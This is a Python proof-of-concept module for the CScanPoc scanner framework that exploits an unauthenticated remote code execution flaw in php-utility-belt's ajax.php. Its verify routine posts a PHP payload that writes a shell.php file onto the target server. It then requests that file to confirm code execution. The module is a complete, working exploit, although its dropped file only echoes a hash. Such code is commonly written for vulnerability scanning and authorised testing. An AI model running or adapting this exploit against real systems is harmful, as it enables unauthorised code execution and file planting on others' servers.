# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHP_0005'  # 平台漏洞编号，留空
    name = 'php-utility-belt 远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-12-08'  # 漏洞公布时间
    desc = '''
        PHP utility belt is a set of tools for PHP developers. Install in a browser-accessible directory and have at it.
        ajax.php is accessible without any authentication .
        Vulnerable code (Line number 12 to 15)
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/38901/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHP'  # 漏洞应用名称
    product_version = 'php-utility-belt'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8d9fb854-cca1-47cb-98b3-2a3a87b2938f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            url = self.target + '/ajax.php'
            POST_Data = "code=fwrite(fopen('shell.php','w'),'<?php echo md5(123);?>');"
            hh.http(url, data=POST_Data)
            shellurl = self.target + '/shell.php'
            code, head, res, errcode, _ = hh.http(shellurl)

            if code == 200 and '202cb962ac59075b964b07152d234b70' in res:
                #security_info('PHP Utility Belt - Remote Code Execution')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
